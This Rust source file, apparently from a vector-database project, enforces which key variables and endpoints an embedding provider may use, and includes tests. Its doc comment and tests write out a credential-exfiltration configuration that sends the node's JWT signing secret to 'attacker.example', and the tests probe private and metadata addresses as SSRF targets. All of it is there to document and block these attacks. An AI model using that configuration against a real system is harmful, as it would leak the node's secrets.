//! What an embedding provider may be handed, and where it may be sent.
//!
//! # The hazard
//!
//! A collection's vector configuration names an endpoint and the environment
//! variable holding the key for it, and the provider sends that variable's
//! value to that endpoint as a bearer token. Left unconstrained, that is a
//! credential exfiltration primitive in the hands of anyone holding `ddl`:
//! configure `{"kind":"open_ai","endpoint":"https://attacker.example",
//! "api_key_env":"KIMMY_JWT_SECRET"}`, insert one document, and the node
//! posts its own token-signing secret to the attacker with the embedding
//! request. The same setting is a server-side request forgery primitive from
//! the node's network position, exactly as an unpoliced webhook was.
//!
//! # The policy
//!
//! Three rules, all of them the operator's rather than the collection's:
//!
//! - **Which variables a provider may read.** A hard denylist first: every
//!   `KIMMY_*` variable that is not `KIMMY_PROVIDER_*` belongs to the node —
//!   the signing secret, the cluster secret, the bootstrap password — and no
//!   configuration can allow one. Then an allowlist,
//!   `vector.provider.allowed_key_env`, of exact names or prefixes with one
//!   trailing `*`, defaulting to the three documented key variables and the
//!   `KIMMY_PROVIDER_*` namespace. A variable outside it is refused by name.
//! - **Where a request may go.** The address policy webhooks use
//!   (`kimmy_egress`): public addresses only unless the host is listed in
//!   `vector.provider.allowed_hosts`, every resolved address checked, at
//!   configure time and again inside the client's resolver at connect time.
//! - **Profiles, and the lock.** An operator may define providers server-side
//!   under `[vector.providers.<name>]`; a collection then names one with
//!   `{"kind":"profile","name":…}`. With `vector.provider.endpoints_locked`
//!   a collection may name nothing else: `profile`, `byo` and `local` are the
//!   only kinds configure time accepts.
//!
//! # Enforced twice, on purpose
//!
//! At configure time in the API, where the person who typed the
//! configuration is watching and a `400` names the variable or the host. And
//! again at use time, when the worker or a search builds the provider —
//! because a configuration also arrives by replication from another member,
//! having passed that member's API and never this one's. The second check is
//! what makes the first one a policy rather than a courtesy.

use std::collections::BTreeMap;

use kimmy_core::ProviderConfig;
use kimmy_egress::{EgressError, EgressPolicy, Purpose, Refusal};

/// How a refused provider destination reads.
pub const PROVIDER_EGRESS: Purpose =
    Purpose::new("embedding providers", "vector.provider.allowed_hosts");

/// The prefix every variable the node itself reads carries.
pub const NODE_PREFIX: &str = "KIMMY_";
/// The one `KIMMY_` namespace a provider may be handed: variables set for
/// providers and nothing else.
pub const PROVIDER_PREFIX: &str = "KIMMY_PROVIDER_";

/// The setting a refused key variable names.
const KEY_ENV_SETTING: &str = "vector.provider.allowed_key_env";

/// What `vector.provider.allowed_key_env` holds when the operator sets nothing:
/// the three documented default key variables, and the namespace reserved for
/// provider keys.
pub fn default_allowed_key_env() -> Vec<String> {
    ["OPENAI_API_KEY", "COHERE_API_KEY", "GEMINI_API_KEY", "KIMMY_PROVIDER_*"]
        .into_iter()
        .map(String::from)
        .collect()
}

/// Whether a variable is the node's own and can never be handed to a provider.
fn is_node_secret(var: &str) -> bool {
    var.starts_with(NODE_PREFIX) && !var.starts_with(PROVIDER_PREFIX)
}

/// One entry of the allowlist.
#[derive(Clone, Debug, PartialEq, Eq)]
enum KeyPattern {
    Exact(String),
    /// Everything up to the trailing `*`.
    Prefix(String),
}

impl KeyPattern {
    /// Parse an allowlist entry: a variable name, or a prefix with one
    /// trailing `*`. A `*` anywhere else is refused rather than matched
    /// literally, because a pattern that silently matches nothing is a
    /// configuration that looks stricter than it is.
    fn parse(entry: &str) -> Result<Self, String> {
        if entry.is_empty() {
            return Err(format!("{KEY_ENV_SETTING} has an empty entry"));
        }
        match entry.strip_suffix('*') {
            Some(prefix) if prefix.contains('*') => Err(format!(
                "{KEY_ENV_SETTING} entry {entry:?} has more than one `*`; a pattern is a \
                 prefix with a single trailing `*`"
            )),
            Some("") => Err(format!(
                "{KEY_ENV_SETTING} entry {entry:?} would allow every variable; list the \
                 names or prefixes a provider may be handed"
            )),
            Some(prefix) => Ok(Self::Prefix(prefix.to_string())),
            None if entry.contains('*') => Err(format!(
                "{KEY_ENV_SETTING} entry {entry:?} has a `*` that is not trailing; a pattern \
                 is a prefix with a single trailing `*`"
            )),
            None => Ok(Self::Exact(entry.to_string())),
        }
    }

    fn matches(&self, var: &str) -> bool {
        match self {
            Self::Exact(name) => name == var,
            Self::Prefix(prefix) => var.starts_with(prefix.as_str()),
        }
    }

    /// Whether this entry could admit a variable the denylist refuses. Such
    /// an entry is refused at configuration time: an operator who wrote
    /// `KIMMY_*` meant something the policy will never do, and a silent
    /// no-op would leave them believing it did.
    fn reaches_node_secrets(&self) -> bool {
        match self {
            Self::Exact(name) => is_node_secret(name),
            // `K*` admits `KIMMY_JWT_SECRET` by prefix and is refused, but
            // `KIMMY_PROVIDER_*` — the default — admits only the provider
            // namespace and is fine. A prefix shorter than `KIMMY_PROVIDER_`
            // that `KIMMY_` starts with, or that starts with `KIMMY_`, reaches
            // a node secret; one that is `KIMMY_PROVIDER_` or longer does not.
            Self::Prefix(prefix) => {
                if prefix.starts_with(PROVIDER_PREFIX) {
                    return false;
                }
                NODE_PREFIX.starts_with(prefix.as_str()) || prefix.starts_with(NODE_PREFIX)
            }
        }
    }
}

/// Why a provider configuration was refused.
#[derive(Clone, Debug, PartialEq, Eq)]
pub enum PolicyError {
    /// The variable is one of the node's own and can never be allowed.
    DeniedKeyEnv { var: String },
    /// The variable is not in `vector.provider.allowed_key_env`.
    UnlistedKeyEnv { var: String },
    /// `endpoints_locked` is set and the kind is not one of the permitted three.
    Locked { kind: &'static str },
    /// No `[vector.providers.<name>]` on this node.
    UnknownProfile { name: String },
    /// The endpoint fails the address policy.
    Endpoint(EgressError),
}

impl std::fmt::Display for PolicyError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PolicyError::DeniedKeyEnv { var } => write!(
                f,
                "api_key_env {var:?} is refused: {NODE_PREFIX}* variables other than \
                 {PROVIDER_PREFIX}* are this node's own secrets and are never handed to an \
                 embedding provider, whatever {KEY_ENV_SETTING} says"
            ),
            PolicyError::UnlistedKeyEnv { var } => write!(
                f,
                "api_key_env {var:?} is not in {KEY_ENV_SETTING}; an embedding provider may \
                 only be handed a variable the operator has listed there"
            ),
            PolicyError::Locked { kind } => write!(
                f,
                "vector.provider.endpoints_locked is set on this node, so a collection may \
                 only use a server-defined provider profile ({{\"kind\":\"profile\",\
                 \"name\":…}}), byo or local; kind {kind:?} is refused"
            ),
            PolicyError::UnknownProfile { name } => write!(
                f,
                "no provider profile named {name:?}; vector.providers.{name} is not \
                 configured on this node"
            ),
            PolicyError::Endpoint(e) => write!(f, "endpoint refused: {e}"),
        }
    }
}

impl std::error::Error for PolicyError {}

impl PolicyError {
    /// Whether the refusal is a host that could not be resolved — the one
    /// outcome that is a condition of the moment rather than of the
    /// configuration, and so worth retrying.
    pub fn is_unresolvable(&self) -> bool {
        matches!(self, PolicyError::Endpoint(EgressError { refusal: Refusal::Unresolvable(_), .. }))
    }
}

/// The operator's policy for embedding providers on this node.
#[derive(Clone, Debug)]
pub struct ProviderPolicy {
    allowed_key_env: Vec<KeyPattern>,
    egress: EgressPolicy,
    locked: bool,
    profiles: BTreeMap<String, ProviderConfig>,
}

impl Default for ProviderPolicy {
    /// The policy a node runs with nothing configured: the default
    /// allowlist, public addresses only, unlocked, no profiles.
    fn default() -> Self {
        Self::new(default_allowed_key_env(), Vec::new(), false, BTreeMap::new())
            .expect("the default policy is valid")
    }
}

impl ProviderPolicy {
    /// Build a policy from the operator's settings.
    ///
    /// Refuses, as a configuration error, an allowlist entry that could admit
    /// a node secret, a malformed pattern, and a profile that fails the
    /// network-free half of the checks (its key variable, its URL's shape, or
    /// naming another profile). The resolving half is
    /// [`Self::validate_profiles`], run where an operator is watching.
    pub fn new(
        allowed_key_env: Vec<String>,
        allowed_hosts: Vec<String>,
        locked: bool,
        profiles: BTreeMap<String, ProviderConfig>,
    ) -> Result<Self, String> {
        let mut patterns = Vec::with_capacity(allowed_key_env.len());
        for entry in &allowed_key_env {
            let pattern = KeyPattern::parse(entry)?;
            if pattern.reaches_node_secrets() {
                return Err(format!(
                    "{KEY_ENV_SETTING} lists {entry:?}, which would hand a provider one of \
                     this node's own {NODE_PREFIX}* secrets; only {PROVIDER_PREFIX}* is \
                     allowed from that namespace, and it cannot be configured otherwise"
                ));
            }
            patterns.push(pattern);
        }
        let policy = Self {
            allowed_key_env: patterns,
            egress: EgressPolicy::new(PROVIDER_EGRESS, allowed_hosts),
            locked,
            profiles,
        };
        for (name, config) in &policy.profiles {
            policy.check_profile_shape(name, config)?;
        }
        Ok(policy)
    }

    /// The network-free checks on one profile.
    fn check_profile_shape(&self, name: &str, config: &ProviderConfig) -> Result<(), String> {
        let setting = format!("vector.providers.{name}");
        if let ProviderConfig::Profile { .. } = config {
            return Err(format!("{setting} names another profile; a profile is a provider"));
        }
        config.validate().map_err(|e| format!("{setting}: {e}"))?;
        if let Some(var) = config.api_key_env() {
            self.check_key_env(var).map_err(|e| format!("{setting}: {e}"))?;
        }
        if let Some(url) = config.endpoint() {
            self.egress.check_shape(url).map_err(|e| format!("{setting}: {e}"))?;
        }
        Ok(())
    }

    /// The resolving check on every profile: each endpoint's host resolved
    /// and every address checked, as a collection's own endpoint is at
    /// configure time. Run at startup and by `check-config`, so the two give
    /// the same answer.
    pub fn validate_profiles(&self) -> Result<(), String> {
        for (name, config) in &self.profiles {
            self.check_provider(config).map_err(|e| format!("vector.providers.{name}: {e}"))?;
        }
        Ok(())
    }

    /// Where a provider may be sent.
    pub fn egress(&self) -> &EgressPolicy {
        &self.egress
    }

    /// Whether configure time accepts only `profile`, `byo` and `local`.
    pub fn locked(&self) -> bool {
        self.locked
    }

    /// The operator-defined providers, by name.
    pub fn profiles(&self) -> &BTreeMap<String, ProviderConfig> {
        &self.profiles
    }

    /// Whether a provider may be handed this variable.
    ///
    /// The denylist is consulted first and cannot be configured around: a
    /// `KIMMY_*` name that is not `KIMMY_PROVIDER_*` is refused whatever the
    /// allowlist says. Only then does the allowlist decide.
    pub fn check_key_env(&self, var: &str) -> Result<(), PolicyError> {
        if is_node_secret(var) {
            return Err(PolicyError::DeniedKeyEnv { var: var.to_string() });
        }
        if self.allowed_key_env.iter().any(|p| p.matches(var)) {
            return Ok(());
        }
        Err(PolicyError::UnlistedKeyEnv { var: var.to_string() })
    }

    /// Whether a provider may be sent to this URL: shape, then every address
    /// the host resolves to.
    pub fn check_endpoint(&self, url: &str) -> Result<(), PolicyError> {
        self.egress.check(url).map_err(PolicyError::Endpoint)
    }

    /// The key and endpoint checks on a concrete provider — everything but a
    /// profile, which is resolved first by [`Self::resolve`].
    pub fn check_provider(&self, config: &ProviderConfig) -> Result<(), PolicyError> {
        if let Some(var) = config.api_key_env() {
            self.check_key_env(var)?;
        }
        if let Some(url) = config.endpoint() {
            self.check_endpoint(url)?;
        }
        Ok(())
    }

    /// What configure time refuses.
    ///
    /// A profile has to exist here; `byo` and `local` reach nothing and pass;
    /// under the lock, everything else is refused by kind. Otherwise the key
    /// variable and the endpoint — the default one, for a dialect whose
    /// endpoint was left out — are checked as they will be used.
    pub fn check_configure(&self, config: &ProviderConfig) -> Result<(), PolicyError> {
        match config {
            ProviderConfig::Byo | ProviderConfig::Local { .. } => Ok(()),
            ProviderConfig::Profile { name } => self
                .resolve(config)
                .map(|_| ())
                .or(Err(PolicyError::UnknownProfile { name: name.clone() })),
            other if self.locked => Err(PolicyError::Locked { kind: other.name() }),
            other => self.check_provider(other),
        }
    }

    /// The provider a configuration stands for: the named profile's, or the
    /// configuration itself. Only the lookup — the caller checks the result
    /// with [`Self::check_provider`], so it can name the concrete dialect in
    /// what it reports.
    pub fn resolve<'a>(
        &'a self,
        config: &'a ProviderConfig,
    ) -> Result<&'a ProviderConfig, PolicyError> {
        match config {
            ProviderConfig::Profile { name } => self
                .profiles
                .get(name)
                .ok_or_else(|| PolicyError::UnknownProfile { name: name.clone() }),
            other => Ok(other),
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn policy(allowed: &[&str]) -> ProviderPolicy {
        ProviderPolicy::new(
            allowed.iter().map(|s| s.to_string()).collect(),
            Vec::new(),
            false,
            BTreeMap::new(),
        )
        .unwrap()
    }

    fn openai(endpoint: Option<&str>, key_env: &str) -> ProviderConfig {
        ProviderConfig::OpenAi {
            model: "m".into(),
            endpoint: endpoint.map(Into::into),
            api_key_env: key_env.into(),
            dimensions: None,
        }
    }

    #[test]
    fn the_nodes_own_secrets_are_refused_whatever_the_allowlist_says() {
        // The finding this module closes: a `ddl` holder naming the signing
        // secret as the provider's key variable. Refused by name, and not
        // configurable — an allowlist that names one is itself refused below.
        let p = ProviderPolicy::default();
        for var in [
            "KIMMY_JWT_SECRET",
            "KIMMY_CLUSTER_SECRET",
            "KIMMY_ROOT_PASSWORD",
            "KIMMY_JWT_PREVIOUS_SECRET",
        ] {
            let err = p.check_key_env(var).unwrap_err();
            assert!(matches!(err, PolicyError::DeniedKeyEnv { .. }), "{var}: {err:?}");
            assert!(err.to_string().contains(var), "the refusal names the variable: {err}");
        }
        // There is no allowlist that reaches them: one that would is refused
        // when the policy is built, below.
    }

    #[test]
    fn a_variable_outside_the_allowlist_is_refused_by_name() {
        let err = ProviderPolicy::default().check_key_env("VOYAGE_API_KEY").unwrap_err();
        assert!(matches!(err, PolicyError::UnlistedKeyEnv { .. }), "{err:?}");
        let text = err.to_string();
        assert!(text.contains("VOYAGE_API_KEY"), "{text}");
        assert!(text.contains("vector.provider.allowed_key_env"), "the setting to edit: {text}");
    }

    #[test]
    fn listed_names_and_the_provider_namespace_are_accepted() {
        let p = ProviderPolicy::default();
        for var in ["OPENAI_API_KEY", "COHERE_API_KEY", "GEMINI_API_KEY", "KIMMY_PROVIDER_FOO"] {
            p.check_key_env(var).unwrap_or_else(|e| panic!("{var}: {e}"));
        }
        policy(&["VOYAGE_API_KEY"]).check_key_env("VOYAGE_API_KEY").unwrap();
    }

    #[test]
    fn a_glob_matches_only_with_a_trailing_star() {
        let p = policy(&["ACME_*"]);
        p.check_key_env("ACME_EMBED_KEY").unwrap();
        p.check_key_env("ACME_").unwrap();
        assert!(p.check_key_env("ACME").is_err(), "the prefix itself, without the underscore");
        assert!(p.check_key_env("XACME_KEY").is_err(), "a prefix, not a substring");
        // An exact entry is exact.
        assert!(policy(&["ACME_KEY"]).check_key_env("ACME_KEY_2").is_err());
        // A star anywhere but the end is a configuration error, not a
        // literal or a wildcard.
        for bad in ["ACME_*_KEY", "*ACME", "*", "**", ""] {
            let err = ProviderPolicy::new(vec![bad.into()], Vec::new(), false, BTreeMap::new())
                .expect_err(bad);
            assert!(err.contains("vector.provider.allowed_key_env"), "{bad}: {err}");
        }
    }

    #[test]
    fn an_allowlist_that_reaches_a_node_secret_is_a_configuration_error() {
        // Silently never matching would leave the operator believing the
        // entry did something. Refused at the point it was written.
        for bad in ["KIMMY_JWT_SECRET", "KIMMY_*", "KIMMY_J*", "KIM*", "K*", "KIMMY_PROVIDE*"] {
            let err = ProviderPolicy::new(vec![bad.into()], Vec::new(), false, BTreeMap::new())
                .expect_err(bad);
            assert!(err.contains(bad), "{bad}: {err}");
            assert!(err.contains("vector.provider.allowed_key_env"), "{bad}: {err}");
        }
        // The provider namespace, exact or by prefix, is the one that is fine.
        for ok in ["KIMMY_PROVIDER_*", "KIMMY_PROVIDER_OPENAI", "KIMMY_PROVIDER_ACME_*"] {
            ProviderPolicy::new(vec![ok.into()], Vec::new(), false, BTreeMap::new())
                .unwrap_or_else(|e| panic!("{ok}: {e}"));
        }
    }

    #[test]
    fn a_private_endpoint_is_refused_unless_the_host_is_allowed() {
        let p = ProviderPolicy::default();
        for url in
            ["http://127.0.0.1:11434", "http://10.0.0.5/v1/embeddings", "http://169.254.169.254/"]
        {
            let err = p.check_endpoint(url).unwrap_err();
            assert!(matches!(err, PolicyError::Endpoint(_)), "{url}: {err:?}");
            assert!(err.to_string().contains("vector.provider.allowed_hosts"), "{err}");
        }
        let allowed = ProviderPolicy::new(
            default_allowed_key_env(),
            vec!["127.0.0.1".into()],
            false,
            BTreeMap::new(),
        )
        .unwrap();
        allowed.check_endpoint("http://127.0.0.1:11434").unwrap();
        assert!(allowed.check_endpoint("http://10.0.0.5/").is_err(), "only the listed host");
    }

    #[test]
    fn configure_time_checks_the_default_endpoint_and_the_key_together() {
        let p = ProviderPolicy::default();
        // The hosted defaults are public and pass with no configuration.
        p.check_configure(&openai(None, "OPENAI_API_KEY")).unwrap();
        // The finding, end to end: a public attacker endpoint with the
        // node's secret named as the key.
        let err = p
            .check_configure(&openai(Some("https://attacker.example"), "KIMMY_JWT_SECRET"))
            .unwrap_err();
        assert!(matches!(err, PolicyError::DeniedKeyEnv { .. }), "{err:?}");
        // And a listed key sent to a private address.
        let err =
            p.check_configure(&openai(Some("http://10.0.0.5"), "OPENAI_API_KEY")).unwrap_err();
        assert!(matches!(err, PolicyError::Endpoint(_)), "{err:?}");
        // byo and local reach nothing.
        p.check_configure(&ProviderConfig::Byo).unwrap();
        p.check_configure(&ProviderConfig::Local { model: "m".into() }).unwrap();
        // An unauthenticated custom endpoint has no variable to check, only
        // an address — a literal public one here, so no resolver is needed.
        p.check_configure(&ProviderConfig::CustomHttp {
            endpoint: "https://93.184.216.34/v1".into(),
            api_key_env: None,
        })
        .unwrap();
    }

    #[test]
    fn the_lock_refuses_free_form_endpoints_and_accepts_a_profile() {
        let mut profiles = BTreeMap::new();
        profiles.insert(
            "corp".to_string(),
            openai(Some("https://embed.example"), "KIMMY_PROVIDER_CORP"),
        );
        let locked =
            ProviderPolicy::new(default_allowed_key_env(), Vec::new(), true, profiles).unwrap();
        assert!(locked.locked());

        // A configuration that would pass unlocked is refused by kind.
        let err = locked.check_configure(&openai(None, "OPENAI_API_KEY")).unwrap_err();
        assert!(matches!(err, PolicyError::Locked { kind: "openai" }), "{err:?}");
        assert!(err.to_string().contains("endpoints_locked"), "{err}");
        let err = locked
            .check_configure(&ProviderConfig::Ollama {
                model: "m".into(),
                endpoint: "https://x".into(),
            })
            .unwrap_err();
        assert!(matches!(err, PolicyError::Locked { kind: "ollama" }), "{err:?}");

        // The three kinds that reach nothing the operator did not define.
        locked.check_configure(&ProviderConfig::Profile { name: "corp".into() }).unwrap();
        locked.check_configure(&ProviderConfig::Byo).unwrap();
        locked.check_configure(&ProviderConfig::Local { model: "m".into() }).unwrap();

        // A profile that does not exist is refused where there is someone to
        // tell, and the message names the setting that would define it.
        let err =
            locked.check_configure(&ProviderConfig::Profile { name: "nope".into() }).unwrap_err();
        assert!(matches!(err, PolicyError::UnknownProfile { .. }), "{err:?}");
        assert!(err.to_string().contains("vector.providers.nope"), "{err}");
    }

    #[test]
    fn a_profile_resolves_to_the_operators_provider() {
        let mut profiles = BTreeMap::new();
        let corp = openai(Some("https://embed.example"), "KIMMY_PROVIDER_CORP");
        profiles.insert("corp".to_string(), corp.clone());
        let p =
            ProviderPolicy::new(default_allowed_key_env(), Vec::new(), false, profiles).unwrap();
        let named = ProviderConfig::Profile { name: "corp".into() };
        assert_eq!(p.resolve(&named).unwrap(), &corp);
        // A concrete provider resolves to itself.
        let own = openai(None, "OPENAI_API_KEY");
        assert_eq!(p.resolve(&own).unwrap(), &own);
        let missing = ProviderConfig::Profile { name: "other".into() };
        assert!(matches!(p.resolve(&missing), Err(PolicyError::UnknownProfile { .. })));
    }

    #[test]
    fn a_profile_is_held_to_the_same_policy_as_a_collection() {
        // The operator's own definition is not exempt: a profile that names a
        // node secret, a private host, or another profile is a configuration
        // error where the operator can see it.
        let with = |name: &str, config: ProviderConfig| {
            let mut profiles = BTreeMap::new();
            profiles.insert(name.to_string(), config);
            ProviderPolicy::new(default_allowed_key_env(), Vec::new(), false, profiles)
        };
        let err = with("bad", openai(None, "KIMMY_JWT_SECRET")).unwrap_err();
        assert!(err.contains("vector.providers.bad"), "{err}");
        assert!(err.contains("KIMMY_JWT_SECRET"), "{err}");

        let err = with("bad", openai(Some("not a url"), "OPENAI_API_KEY")).unwrap_err();
        assert!(err.contains("vector.providers.bad"), "{err}");

        let err = with("bad", ProviderConfig::Profile { name: "other".into() }).unwrap_err();
        assert!(err.contains("names another profile"), "{err}");

        // The address half needs a resolver and runs separately, giving the
        // same answer a collection's endpoint gets.
        let private = with("lan", openai(Some("http://10.0.0.5"), "OPENAI_API_KEY")).unwrap();
        let err = private.validate_profiles().unwrap_err();
        assert!(err.contains("vector.providers.lan"), "{err}");
        assert!(err.contains("vector.provider.allowed_hosts"), "{err}");

        // A literal public address, so the check needs no DNS.
        let literal = with("ok", openai(Some("https://93.184.216.34"), "OPENAI_API_KEY")).unwrap();
        literal.validate_profiles().unwrap();
    }

    #[test]
    fn the_default_policy_is_the_documented_one() {
        assert_eq!(
            default_allowed_key_env(),
            vec!["OPENAI_API_KEY", "COHERE_API_KEY", "GEMINI_API_KEY", "KIMMY_PROVIDER_*"]
        );
        let p = ProviderPolicy::default();
        assert!(!p.locked());
        assert!(p.profiles().is_empty());
        assert_eq!(p.egress().purpose(), PROVIDER_EGRESS);
    }
}
